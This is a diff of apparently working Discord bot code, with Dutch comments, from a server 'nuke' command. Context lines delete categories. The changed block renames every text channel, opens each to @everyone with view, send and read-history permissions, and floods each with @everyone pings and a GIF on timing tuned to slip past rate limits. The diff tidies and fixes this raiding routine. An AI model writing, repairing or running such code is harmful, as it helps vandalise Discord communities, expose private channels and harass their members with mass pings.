@@ -56,38 +56,49 @@ client.on('messageCreate', async message => {
             try { await category.delete(); await new Promise(r => setTimeout(r, 400)); } catch {}
         }
 
-        // 3. Channels aanpassen
-        await message.channel.send("🔄 Channels hernoemen + zichtbaar maken + spammen...");
+// 3. Channels aanpassen
+await message.channel.send("🔄 Channels hernoemen + zichtbaar maken + spammen...");
 
-        let processed = 0;
-        for (const channel of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values()) {
-            try {
-                // Hernoemen
-                await channel.setName("Finnson the goat");
+let processed = 0;
 
-                // Zorgen dat iedereen het kan zien
-                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
-                    ViewChannel: true,
-                    SendMessages: true,
-                    ReadMessageHistory: true
-                });
+for (const channel of message.guild.channels.cache
+    .filter(ch => ch.type === ChannelType.GuildText)
+    .values()) {
 
-                // Spam
-                for (let i = 0; i < spamAmount; i++) {
-                    await channel.send(`@everyone\n${GIF_URL}`);
+    try {
+        // Hernoemen
+        await channel.setName("Finnson the goat");
 
-                    if (i % 2 === 0) {
-                        await new Promise(r => setTimeout(r, 800));
-                    } else {
-                        await new Promise(r => setTimeout(r, 80));
-                    }
-                }
+        // Rechten aanpassen
+        await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
+            ViewChannel: true,
+            SendMessages: true,
+            ReadMessageHistory: true
+        });
 
-        await message.channel.send(`✅ Klaar! **${processed}** channels aangepast en gespamd.`);
-        return;
+        // Spam
+        for (let i = 0; i < spamAmount; i++) {
+            await channel.send(`@everyone\n${GIF_URL}`);
+
+            if (i % 2 === 0) {
+                await new Promise(r => setTimeout(r, 800));
+            } else {
+                await new Promise(r => setTimeout(r, 80));
+            }
+        }
+
+        processed++;
+
+    } catch (err) {
+        console.error(`Fout bij ${channel.name}:`, err);
     }
+}
 
-    // Normale delete
+await message.channel.send(
+    `✅ Klaar! **${processed}** channels aangepast en gespamd.`
+);
+return; // Normale delete
+        
     let target = args.length > 0 ? message.mentions.channels.first() : message.channel;
     if (target) {
         try {
